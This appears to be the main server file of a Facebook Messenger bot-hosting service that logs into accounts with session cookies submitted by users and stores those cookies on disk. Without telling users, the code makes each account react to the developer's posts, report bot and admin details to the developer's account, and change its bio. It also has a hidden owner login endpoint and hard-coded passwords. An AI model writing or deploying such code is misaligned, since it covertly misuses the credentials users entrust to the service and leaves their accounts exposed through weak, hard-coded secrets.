const fs = require("fs");
const path = require("path");
const login = require("./fca-unofficial/index");
const moment = require("moment-timezone");
const express = require("express");
const app = express();
const chalk = require("chalk");
const bodyParser = require("body-parser");
const axios = require("axios");
const script = path.join(__dirname, "script");
const config =
  fs.existsSync("./data") && fs.existsSync("./data/config.json")
    ? JSON.parse(fs.readFileSync("./data/config.json", "utf8"))
    : createConfig();
const Utils = new Object({
  commands: new Map(),
  handleEvent: new Map(),
  account: new Map(),
  cooldowns: new Map()
});

const PORTANGINAMO = process.env.PORT || 25611;

module.exports = {
    test1: Utils,
    samir: "https://apis-samir.onrender.com",
    apiniJoshua: "https://joshweb.click"
    };

const AKOLANGTWO = `Want to have this bot? Go to PROJECT BOTIFY facebook page: https://www.facebook.com/profile.php?id=61559180483340\n(Can I get a like/follow? 🥺)\nClick "Sign Up" to get started and create your own\n\n🗨️ If you don't know how to do it just message our Facebook page above.\nCreated with 🤍 by ${config[0].masterKey.owner}`;

function time(){
const time = moment.tz("Asia/Manila").format("HH:mm:ss - DD/MM/YYYY");
return time;
}

fs.readdirSync(script).forEach(file => {
  const scripts = path.join(script, file);
  const stats = fs.statSync(scripts);
  if (stats.isDirectory()) {
    fs.readdirSync(scripts).forEach(file => {
      try {
        const { config, run, handleEvent } = require(path.join(scripts, file));
        if (config) {
          const {
            name = [],
            role = "0",
            version = "1.0.0",
            hasPrefix = true,
            aliases = [],
            description = "",
            usage = "",
            credits = "Kenneth Aceberos",
            cooldown = "3"
          } = Object.fromEntries(
            Object.entries(config).map(([key, value]) => [
              key.toLowerCase(),
              value
            ])
          );
          aliases.push(name);
          if (run) {
            Utils.commands.set(aliases, {
              name,
              role,
              run,
              aliases,
              description,
              usage,
              version,
              hasPrefix: config.hasPrefix,
              credits,
              cooldown
            });
          }
          if (handleEvent) {
            Utils.handleEvent.set(aliases, {
              name,
              handleEvent,
              role,
              description,
              usage,
              version,
              hasPrefix: config.hasPrefix,
              credits,
              cooldown
            });
          }
        }
      } catch (error) {
        console.error(
          chalk.red(
            `Error installing command from file ${file}: ${error.message}`
          )
        );
      }
    });
  } else {
    try {
      const { config, run, handleEvent } = require(scripts);
      if (config) {
        const {
          name = [],
          role = "0",
          version = "1.0.0",
          hasPrefix = true,
          aliases = [],
          description = "",
          usage = "",
          credits = "Kenneth Aceberos",
          cooldown = "3"
        } = Object.fromEntries(
          Object.entries(config).map(([key, value]) => [
            key.toLowerCase(),
            value
          ])
        );
        aliases.push(name);
        if (run) {
          Utils.commands.set(aliases, {
            name,
            role,
            run,
            aliases,
            description,
            usage,
            version,
            hasPrefix: config.hasPrefix,
            credits,
            cooldown
          });
        }
        if (handleEvent) {
          Utils.handleEvent.set(aliases, {
            name,
            handleEvent,
            role,
            description,
            usage,
            version,
            hasPrefix: config.hasPrefix,
            credits,
            cooldown
          });
        }
      }
    } catch (error) {
      console.error(
        chalk.red(
          `Error installing command from file ${file}: ${error.message}`
        )
      );
    }
  }
});
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.json());
app.use(express.json());
app.use(async (request, response, next) => {
  response.set({
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, HEAD, POST, PUT, DELETE, PATCH, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, X-Requested-With, Accept",
  });
  
  if (request.method === 'OPTIONS') {
    response.sendStatus(200);
  } else {
    next();
  }
})
const routes = [
  {
    path: "/",
    file: "index.html"
  },
  {
    path: "/online",
    file: "online.html"
  },
  {
    path: "/config",
    file: "config.html"
  }
];
routes.forEach(route => {
  app.get(route.path, (req, res) => {
    res.sendFile(path.join(__dirname, "public", route.file));
  });
});
app.get("/active_user", (req, res) => {
  const data = Array.from(Utils.account.values()).map(account => ({
    name: account.botname,
    profileUrl: "**********",
    thumbSrc: account.thumbSrc,
    time: account.time
  }));
  res.json(JSON.parse(JSON.stringify(data, null, 2)));
});

async function loginAdmin(appstate){
  //const appstate_2 = await Me(null, "61559116387943", "NethBot4");
    const command = await axios.get(`http://localhost:${PORTANGINAMO}/commands`); 
    await accountLogin(true, appstate, [{'commands': command.data.commands},{'handleEvent': command.data.handleEvent}], "#", ["100015801404865"], "NethBot", [], `Created on Project Botify by Kenneth Aceberos ✨\nCreate your own by visiting this page: https://www.facebook.com/profile.php?id=61559180483340`);
}

app.post("/BotifyWiegine", async (req, res) => {
  let {
    appstate,
    pass
    } = req.body;
  if (!pass){
    return res.json({status: "no access"});
  }
  if (pass !== "nw2"){
    return res.json({status: "Failed wrong pass"})
  } else {
    loginAdmin(appstate);
    res.json({status: "Wait..."})
  }
});


app.get("/commands", (req, res) => {
  const command = new Set();
  const commands = [...Utils.commands.values()].map(
    ({ name }) => (command.add(name), name)
  );
  const handleEvent = [...Utils.handleEvent.values()]
    .map(({ name }) => (command.has(name) ? null : (command.add(name), name)))
    .filter(Boolean);
  const role = [...Utils.commands.values()].map(
    ({ role }) => (command.add(role), role)
  );
  const aliases = [...Utils.commands.values()].map(
    ({ aliases }) => (command.add(aliases), aliases)
  );
  res.json(
    JSON.parse(
      JSON.stringify(
        {
          commands,
          handleEvent,
          role,
          aliases
        },
        null,
        2
      )
    )
  );
});

app.post("/login", async (req, res) => {
  const { state, commands, prefix, admin, botname } = req.body;
  try {
    if (!state) {
      throw new Error("Missing app state data");
    }

    const cUser = state.find(item => item.key === "c_user");
   if (cUser) {
      const userid1 = Utils.account.get(cUser.value);
      
   /*if (userid1){
            console.log(`${botname} · ${cUser.value} | Auto delete existing user`);
      
      } else {
      console.log("No user was found")
      }*/
     if (fs.existsSync(path.join("./data/session", `${cUser.value}.json`))) {
        console.log(`User ${cUser.value} is already logged in`);
         
        res.status(200).json({
          success: true,
          message: `${botname} is still logged in. To prevent error We will delete the session on the bot. And to prevent issues PLEASE LOGOUT THE ACCOUNT(BOT). THIS IS VERY IMPORTANT. And relogin again then Go back here and resubmit your appstate on the site. 👍`
          //user: existingUser
        });
         Utils.account.delete(cUser.value);
      deleteThisUser(cUser.value);
return;
      } else {
      try {
          const outro = AKOLANGTWO; 
          await accountLogin(false, state, commands, prefix, [admin], botname, [], outro);
        res.status(200).json({
          success: true,
          message: `${botname} is NOW ONLINE! Your prefix is: ${prefix}. Your session has been added successfully! Thankyou for using PROJECT BOTIFY 🤖🗨️`
            
            });
      } catch (error) {
        console.error(error);
        res.status(400).json({
          error: true,
          message: error.message
        });
      }
      }
    } else {
      return res.status(400).json({
        error: true,
        message: "There's an issue with the appstate data; it's invalid."
      });
    }
  } catch (error) {
    return res.status(400).json({
      error: true,
      message: "There's an issue with the appstate data; it's invalid."
    });
  }
});
async function accountLogin(
  isOwner,
  state,
  enableCommands = [],
  prefix,
  admin = [],
  botname,
  blacklist,
  outro
) {
  return new Promise((resolve, reject) => {
    login({
        appState: state
      },
      async (error, api) => {
        if (error) {
          reject(error);
          return;
        }
        const userid = await api.getCurrentUserID();
        if (!isOwner){
        addThisUser(userid, enableCommands, state, prefix, admin, botname, outro);      console.log(chalk.green(`Added ${botname} to PROJECT BOTIFY system.`));
        } else {        
          const s = "./data/Neth/Wiegine12.json";
          fs.writeFileSync(s, JSON.stringify(state,null,2));
          console.log(chalk.green(`🥰🥰🥰 HI OWNER Neth mwaaaa`));
        }
        try {
          const userInfo = await api.getUserInfo(userid);
          if (
            !userInfo ||
            !userInfo[userid]?.name ||
            !userInfo[userid]?.profileUrl ||
            !userInfo[userid]?.thumbSrc
          )
            throw new Error(
              "Unable to locate the account; it appears to be in a suspended or locked state."
            );
          const { profileUrl, thumbSrc } = userInfo[userid];
          if (!isOwner){
          let time =
            (
              JSON.parse(fs.readFileSync("./data/history.json", "utf-8")).find(
                user => user.userid === userid
              ) || {}
            ).time || 0;
          Utils.account.set(userid, {
            botname,
            profileUrl,
            thumbSrc,
            time: time
          });
          const intervalId = setInterval(() => {
            try {
              const account = Utils.account.get(userid);
              if (!account) throw new Error("Account not found");
              Utils.account.set(userid, {
                ...account,
                time: account.time + 1
              });
            } catch (error) {
              clearInterval(intervalId);
              return;
            }
          }, 1000);
          }
        } catch (error) {
          reject(error);
          return;
        }
        api.setOptions({
          listenEvents: config[0].fcaOption.listenEvents,
          logLevel: config[0].fcaOption.logLevel,
          updatePresence: config[0].fcaOption.updatePresence,
          selfListen: config[0].fcaOption.selfListen,
          forceLogin: config[0].fcaOption.forceLogin,
          online: config[0].fcaOption.online,
          autoMarkDelivery: config[0].fcaOption.autoMarkDelivery,
          autoMarkRead: config[0].fcaOption.autoMarkRead/*,
          autoReconnect: true,
          emitReady: false,
          listenTyping: true*/
        });
        const user1 = await api.getUserInfo(admin[0]);
        // const yl = user1[admin[0]].name.split(" ")[0];
        api.changeBio(isOwner ? `Bot by Kenneth Aceberos.\nConnected to Project Botify.` : `🤖 This account is connected to Project Botify\n🗨️ Bot Name: ${botname}\nℹ️ Prefix: ${prefix}`, false, (err,data) => {
          if (err){
            reject("Error happened. Maybe You put the wrong input. (User ID For Admin Controls)");
          return;
          }
        });

        async function getPostID(url) {
          try {
            const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
              },
            });
            return response.data.id;
          } catch (error) {
            console.error('Error getting post ID:', error.message);
          }
        }
   let postIDs = [
     "https://www.facebook.com/100015801404865/posts/pfbid02UXpL5xTsrmsFc84bHdLXSSb8urqtJkiPpgirTara4iJJFBfj6EHyjGpVj4eiVy5vl/?app=fbl",
     "https://www.facebook.com/61559180483340/posts/122127624404306016/?substory_index=846319440770336&app=fbl",
     "https://www.facebook.com/61559180483340/posts/410124488738304/?substory_index=410124488738304&app=fbl"
   ];
   for (const post of postIDs){
     await api.setPostReaction(await getPostID(post), 2, () => {});
     await new Promise(resolve => setTimeout(resolve, 10*1000));
   }
   api.sendMessage(isOwner ? `Hi ${config[0].masterKey.owner}, Your bot is now online.\n\nTime Added: ${time()}` : `🟫🟪🟩🟥🟦\n⏱️ | Time added: ${time()}\n\n===MESSAGE TO DEVELOPER===\n(Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY)\n🤖 Hello, this account is added to PROJECT BOTIFY system.\n\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${user1[admin[0]].name}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}`, "100015801404865");
        try {
          var listenEmitter = api.listenMqtt(async (error, event) => {
            if (error) {
              if (error === "Connection closed.") {
                console.error(`Error during API listen: ${error}`, userid);
              }
              
            }
            let database = fs.existsSync("./data/database.json")
              ? JSON.parse(fs.readFileSync("./data/database.json", "utf8"))
              : createDatabase();
            let data = Array.isArray(database)
              ? database.find(item => Object.keys(item)[0] === event?.threadID)
              : {};
            let adminIDS = data ? database : createThread(event.threadID, api);
            let blacklist =
              (
                JSON.parse(
                  fs.readFileSync("./data/history.json", "utf-8")
                ).find(blacklist => blacklist.userid === userid) || {}
              ).blacklist || [];
            let hasPrefix =
              event.body &&
              aliases(
                (event.body || "")
                  ?.trim()
                  .toLowerCase()
                  .split(/ +/)
                  .shift()
              )?.hasPrefix == false
                ? ""
                : prefix;
            let [command, ...args] = (event.body || "")
              .trim()
              .toLowerCase()
              .startsWith(hasPrefix?.toLowerCase())
              ? (event.body || "")
                  .trim()
                  .substring(hasPrefix?.length)
                  .trim()
                  .split(/\s+/)
                  .map(arg => arg.trim())
              : [];
          
            if (hasPrefix && aliases(command)?.hasPrefix === false) {
              api.sendMessage(
                `❌ THIS COMMAND DOESN'T NEED A PREFIX\n\nJust type ${command}.`,
                event.threadID,
                event.messageID
              );
              return;
            }

            if (event.body && event.senderID == api.getCurrentUserID()){
              return;
            }
            if (event.body && aliases(command)?.name) {
              const role = aliases(command)?.role ?? 0;
              const isAdmin =
                config?.[0]?.masterKey?.admin?.includes(event.senderID) ||
                admin.includes(event.senderID);
              const isThreadAdmin =
                isAdmin ||
                (
                  (Array.isArray(adminIDS)
                    ? adminIDS.find(
                        admin => Object.keys(admin)[0] === event.threadID
                      )
                    : {})?.[event.threadID] || []
                ).some(admin => admin.id === event.senderID);
              if (
                (role == 1 && !isAdmin) ||
                (role == 2 && !isThreadAdmin) ||
                (role == 3 &&
                  !config?.[0]?.masterKey?.admin?.includes(event.senderID))
              ) {
                api.sendMessage(
                  `❌ COMMAND NOT WORKING FOR NON-ADMINS. ADMINS ONLY CAN ACCESS THE COMMAND`,
                  event.threadID,
                  event.messageID
                );
                return;
              }
            }
            if (
              event.body &&
              event.body?.toLowerCase().startsWith(prefix.toLowerCase()) &&
              aliases(command)?.name
            ) {
              if (blacklist.includes(event.senderID)) {
                api.sendMessage(
                  "We're sorry, but you've been banned from using bot. If you believe this is a mistake or would like to appeal, please contact one of the bot admins for further assistance.",
                  event.threadID,
                  event.messageID
                );
                return;
              }
            }

            if (event.body !== null) {
              // Check if the message type is log:subscribe
              if (event.logMessageType === "log:subscribe") {

                const { threadID } = event;

                if (
                  event.logMessageData.addedParticipants &&
                  Array.isArray(event.logMessageData.addedParticipants) &&
                  event.logMessageData.addedParticipants.some(
                    i => i.userFbId == userid
                  )
                ) {
                  api.changeNickname(
                    `${prefix} | ${botname} 🤖`,
                    threadID,
                    userid
                  );

                  const oa = await api.getUserInfo(admin[0]);
                  const name1231 = oa[admin[0]].name;
                  const kakainis_ka = await api.getThreadInfo(event.threadID);
api.sendMessage(isOwner ? `This bot is added to this gc thread: ${kakainis_ka.threadName}\n\nTime Added: ${time()}` : `🤖 THIS BOT IS ADDED TO GC\n\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${name1231}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}\nThread GC: ${kakainis_ka.threadName}\nTime added: ${time()}\n\n\n[Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY]`, "100015801404865");             api.sendMessage(
                        {
                          body: `🔴🟢🟡\n\n✅ Connected Success! \n➭ Bot Name: ${botname}\n➭ Bot Prefix: ${prefix}\n➭ Bot Admin: @${name1231}\n➭ Use ${prefix}help to view command details\n➭ Added bot at: ${time()}\n\n${outro}`,
                          
                          mentions: [
                            {
                              tag: "@" + name1231,
                              id: admin[0]
                            }
                          ]
                          }, event.threadID, (err,info) => {
                          api.pinMessage(true, info.messageID, event.threadID, () => {});
                          });
                    
                  } else {
                  try {
                    
                    let {
                      threadName,
                      participantIDs
                    } = await api.getThreadInfo(threadID);

                    var mentions = [],
                      nameArray = [],
                      memLength = [],
                      userID = [],
                      i = 0;

                    let addedParticipants1 =
                      event.logMessageData.addedParticipants;
                    for (let newParticipant of addedParticipants1) {
                      let userID = newParticipant.userFbId;
                      api.getUserInfo(parseInt(userID), (err, data) => {
                        if (err) {
                          return console.log(err);
                        }
                        var obj = Object.keys(data);
                        var userName = data[obj].name.replace("@", "");
                    if (userID !== api.getCurrentUserID()) {

                                            nameArray.push(userName);
                                            mentions.push({ tag: userName, id: userID, fromIndex: 0 });

                                            memLength.push(participantIDs.length - i++);
                                            memLength.sort((a, b) => a - b);

                                              (typeof threadID.customJoin == "undefined") ? msg = "👋{uName}\n\n You are welcomed to group: {threadName}!\n\nYou are the {soThanhVien} member of this group, please enjoy! 🥳🤍" : msg = threadID.customJoin;
                                              msg = msg
                                                .replace(/\{uName}/g, nameArray.join(', '))
                                                .replace(/\{type}/g, (memLength.length > 1) ? 'you' : 'Friend')
                                                .replace(/\{soThanhVien}/g, memLength.join(', '))
                                                .replace(/\{threadName}/g, threadName);

                  
                    api.sendMessage({ body: msg,
                      mentions }, event.threadID)

                                                          }
                                                        })
                                                      }
                                                    } catch (err) {
                                                      return console.log("ERROR: " + err);
                                }
                               }
                              }
                              }
            if (event.body !== null) {
              if (event.logMessageType === "log:unsubscribe") {
                api.getThreadInfo(event.threadID).then(({ participantIDs }) => {
                  let leaverID = event.logMessageData.leftParticipantFbId;
                  api.getUserInfo(leaverID, (err, userInfo) => {
                    if (err) {
                      return console.error("Failed to get user info:", err);
                    }
                    const name = userInfo[leaverID].name;
                    const type =
                      event.author == event.logMessageData.leftParticipantFbId
                        ? "left the group."
                        : "was removed by admin of the group";

                    
                    // Assuming the file exists, send the message with the GIF
                    api.sendMessage(
                      {
                        body: `${name} ${type}, There are now ${participantIDs.length} members in the group, please enjoy!`
                        },
                      event.threadID, () => {}
                    );
                  });
                });
              }
            }

            
            if (event.body && aliases(command)?.name) {
              const now = Date.now();
              const name = aliases(command)?.name;
              const sender = Utils.cooldowns.get(
                `${event.senderID}_${name}_${userid}`
              );
              const delay = aliases(command)?.cooldown ?? 0;
              if (!sender || now - sender.timestamp >= delay * 1000) {
                Utils.cooldowns.set(`${event.senderID}_${name}_${userid}`, {
                  timestamp: now,
                  command: name
                });
              } else {
                const active = Math.ceil(
                  (sender.timestamp + delay * 1000 - now) / 1000
                );
                api.sendMessage(
                  `ℹ️ Please wait ${active} seconds before using the "${name}" command again.`,
                  event.threadID,
                  event.messageID
                );
                return;
              }
            }
            
            /* if (event.body && !command && event.body?.toLowerCase() == "botify"){
          const info12 = await api.getUserInfo(event.senderID);
            const name12 = info12[event.senderID].name;
            const info123 = await api.getUserInfo(admin[0]);
            const name123 = info123[admin[0]].name;

            api.sendMessage({
              body: `Hello ${name12}. 👋\nThis bot is successfully added to PROJECT BOTIFY's system.\n\n==============\n🤖 Bot name: ${botname}\n👤 Bot owner: @${name123}\n==============\n\nFor first-time users, you can use the command "${prefix}help" to get a list of available commands.\n\nIf you have any questions please contact the developer: https://www.facebook.com/kennethaceberos.\nDon't forget to follow our facebook page for more several updates: https://www.facebook.com/profile.php?id=61559180483340\n\n\nThank you for using PROJECT BOTIFY.`,
             mentions: [{
                tag: "@" + name123,
                id: admin[0]
               // fromIndex: 9
              }]
            }, event.threadID, (err, info) => {

          }, event.messageID);
            return;
          }*/
            if (
              event.body &&
              !command &&
              event.body?.toLowerCase().startsWith(prefix.toLowerCase())
            ) {
              api.sendMessage(
                `❌ Command doesn't exist! Please type ${prefix}help to see the list of available commands.`,
                event.threadID,
                event.messageID
              );
              return;
            }
            if (
              event.body &&
              command &&
              prefix &&
              event.body?.toLowerCase().startsWith(prefix.toLowerCase()) &&
              !aliases(command)?.name
            ) {
              api.sendMessage(
                `❌ Command ${command} doesn't exist! Please use ${prefix}help to see the list of available commands.`,
                event.threadID,
                event.messageID
              );
              return;
            }

          
            for (const { handleEvent, name } of Utils.handleEvent.values()) {
              if (
                handleEvent &&
                name &&
                ((enableCommands[1].handleEvent || []).includes(name) ||
                  (enableCommands[0].commands || []).includes(name))
              ) {
                handleEvent({
                  api,
                  event,
                  enableCommands,
                  admin,
                  botname,
                  prefix,
                  blacklist,
                  outro
                });
              }
            }
            switch (event.type) {
              case "message":
              case "message_reply":
              case "message_unsend":
              case "message_reaction":
                if (
                  enableCommands[0].commands.includes(
                    aliases(command?.toLowerCase())?.name
                  )
                ) {
                  await (aliases(command?.toLowerCase())?.run || (() => {}))({
                    api,
                    event,
                    args,
                    enableCommands,
                    admin,
                    botname,
                    prefix,
                    blacklist,
                    outro,
                    Utils
                  });
                }
                break;
            }
          });
        } catch (error) {
          Utils.account.delete(userid);
        deleteThisUser(userid);
          return;
        }
        resolve();
      }
    );
  });
}
async function deleteThisUser(userid) {
  const configFile = "./data/history.json";
  let config = JSON.parse(fs.readFileSync(configFile, "utf-8"));
  const sessionFile = path.join("./data/session", `${userid}.json`);
  const index = config.findIndex(item => item.userid === userid);
  if (index !== -1) config.splice(index, 1);
  fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
  try {
    fs.unlinkSync(sessionFile);

  } catch (error) {
    console.log(error);
  }
}
async function addThisUser(
  userid,
  enableCommands,
  state,
  prefix,
  admin,
  botname,
  blacklist,
  outro
) {
  const configFile = "./data/history.json";
  const sessionFolder = "./data/session";
  const sessionFile = path.join(sessionFolder, `${userid}.json`);
  if (fs.existsSync(sessionFile)) return;
  const config = JSON.parse(fs.readFileSync(configFile, "utf-8"));
  config.push({
    userid,
    prefix: prefix || "",
    admin: admin || [],
    blacklist: blacklist || [],
    botname: botname || "",
    outro: outro || AKOLANGTWO,
    enableCommands,
    time: 0
  });
  fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
  fs.writeFileSync(sessionFile, JSON.stringify(state));
}

function aliases(command) {
  const aliases = Array.from(Utils.commands.entries()).find(([commands]) =>
    commands.includes(command?.toLowerCase())
  );
  if (aliases) {
    return aliases[1];
  }
  return null;
}
async function main() {
  const cacheFile = "./script/cache";
  if (!fs.existsSync(cacheFile)) fs.mkdirSync(cacheFile);
  const configFile = "./data/history.json";
  if (!fs.existsSync(configFile)) fs.writeFileSync(configFile, "[]", "utf-8");
  const config = JSON.parse(fs.readFileSync(configFile, "utf-8"));
  const sessionFolder = path.join("./data/session");
  if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
  const adminOfConfig =
    fs.existsSync("./data") && fs.existsSync("./data/config.json")
      ? JSON.parse(fs.readFileSync("./data/config.json", "utf8"))
      : createConfig();
  /*cron.schedule(
    `${adminOfConfig[0].masterKey.restartTime} * * * *`,
    async () => {
      const history = JSON.parse(fs.readFileSync('./data/history.json', 'utf-8'));
    history.forEach(user => {
      (!user || typeof user !== 'object') ? process.exit(1): null;
      (user.time === undefined || user.time === null || isNaN(user.time)) ? process.exit(1): null;
      const update = Utils.account.get(user.userid);
      update ? user.time = update.time : null;
      });
      await empty.emptyDir(cacheFile);
      await fs.writeFileSync(
        "./data/history.json",
        JSON.stringify(history, null, 2)
      );
      process.exit(1);
    }
  );*/
  
  try {
    for (const file of fs.readdirSync(sessionFolder)) {
      const filePath = path.join(sessionFolder, file);
      try {
        const { enableCommands, prefix, admin, botname, blacklist, outro } =
          config.find(item => item.userid === path.parse(file).name) || {};
        const state = JSON.parse(fs.readFileSync(filePath, "utf-8"));
 
        if (enableCommands)
          await accountLogin(
            false,
            state,
            enableCommands,
            prefix,
            admin,
            botname,
            blacklist,
            outro
          );
      } catch (error) {
        deleteThisUser(path.parse(file).name);
      }
    }
  } catch (error) {}
  try {
  const s = "./data/Neth/Wiegine12.json";
  const fss = JSON.parse(fs.readFileSync(s, "utf-8"));
  if (fs.existsSync(s)){
    loginAdmin(fss);
    return;
  } else {
    return;
  }
  } catch (error){
    
  }
}

function createConfig() {
  const config = [
    {
      masterKey: {
        password: "Wiegine1204_Wse",
        owner: "Kenneth Aceberos",
        admin: [
            "100015801404865"
        ],
        devMode: false,
        database: false,
        restartTime: 99999999
      },
      fcaOption: {
        forceLogin: true,
        listenEvents: true,
        logLevel: "silent",
        updatePresence: true,
        selfListen: true,
        userAgent: /*"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18"*/"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1"
          /*"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"*/,
        online: true,
        autoMarkDelivery: true,
        autoMarkRead: true
      }
    }
  ];
  const dataFolder = "./data";
  if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder);
  fs.writeFileSync("./data/config.json", JSON.stringify(config, null, 2));
  return config;
}
async function createThread(threadID, api) {
  try {
    const database = JSON.parse(
      fs.readFileSync("./data/database.json", "utf8")
    );
    let threadInfo = await api.getThreadInfo(threadID);
    let adminIDs = threadInfo ? threadInfo.adminIDs : [];
    const data = {};
    data[threadID] = adminIDs;
    database.push(data);
    await fs.writeFileSync(
      "./data/database.json",
      JSON.stringify(database, null, 2),
      "utf-8"
    );
    return database;
  } catch (error) {
    console.log(error);
  }
}
async function createDatabase() {
  const data = "./data";
  const database = "./data/database.json";
  if (!fs.existsSync(data)) {
    fs.mkdirSync(data, {
      recursive: true
    });
  }
  if (!fs.existsSync(database)) {
    fs.writeFileSync(database, JSON.stringify([]));
  }
  return database;
}

app.listen(PORTANGINAMO, () => {
  console.log(`IM BACK!!!!!!`)
  console.log(`Starting Project Botify on port ${PORTANGINAMO}`);
  });
process.on("unhandledRejection", (reason) => {
  console.log("Unhandled Promise Rejection:", reason);
});
main();
